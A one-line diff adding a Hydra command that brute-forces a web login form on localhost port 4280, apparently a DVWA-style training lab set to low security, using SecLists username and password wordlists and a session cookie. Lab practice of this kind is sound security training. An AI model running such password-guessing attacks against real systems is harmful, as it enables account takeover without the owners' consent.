@@ -1,0 +1,1 @@
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=1cde3297fa3687dc3146f39098007a07; security=low:F=Username and/or password incorrect." -s 4280 -v
